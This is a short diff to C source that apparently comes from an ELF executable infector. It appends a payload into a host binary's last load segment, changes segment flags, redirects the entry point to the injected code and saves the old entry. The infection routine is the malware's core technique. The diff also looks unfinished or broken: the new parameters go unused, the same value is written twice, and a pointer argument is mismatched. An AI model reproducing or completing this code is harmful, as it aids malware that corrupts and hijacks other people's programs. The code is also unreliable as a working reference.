@@ -24,7 +24,7 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 }
 
 
-void update(char *b, size_t n, size_t old_entry, size_t entry){
+void update(char *b, size_t n, size_t old_entry, size_t entry, size_t text_offset, size_t text_length){
 	//add a few information about himself
     Elf64_Ehdr *bh = (void*)b;
 	size_t pos = elf_offset_entry(b, n);
@@ -34,6 +34,8 @@ void update(char *b, size_t n, size_t old_entry, size_t entry){
 	((size_t*)((char*)(b + pos + DATA)))[1] = entry - pos;
 	//printf("diff: %zx, size: %zx\n", entry - pos, n);
 	((size_t*)((char*)(b + pos + DATA)))[2] = n;
+	((size_t*)((char*)(b + pos + DATA)))[3] = n;
+	((size_t*)((char*)(b + pos + DATA)))[4] = n;
 	//move to next entry
 }
 
@@ -57,12 +59,12 @@ static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
     size_t pos = ph[x].p_offset + ph[x].p_filesz;
 	_insert(s, n, pos, b, bn);
 	//reset it
-    elf_change_size_last_load_segment(*s, *n, bn);
-    elf_update_flags_of_load_segments(*s, *n);
+    	elf_change_size_last_load_segment(*s, *n, bn);
+    	elf_update_flags_of_load_segments(*s, *n);
 	elf_set_off_entry(*s, *n, pos + 1 + elf_offset_entry(b, bn));
 	elf_shift_offset(*s, *n, pos, bn+diff);
-    h = (void*)*s;
-	update((*s) + pos + 1, bn, old_entry, h->e_entry);
+    	h = (void*)*s;
+	update((*s) + pos + 1, bn, old_entry, h->e_entry, elf_off_text_section(s,n),elf_offset_entry(s,n));
 	//DEBUG
 	println("DEBUG: save to l.vi");
 	fput("l.vi", (*s) + pos + 1, bn);
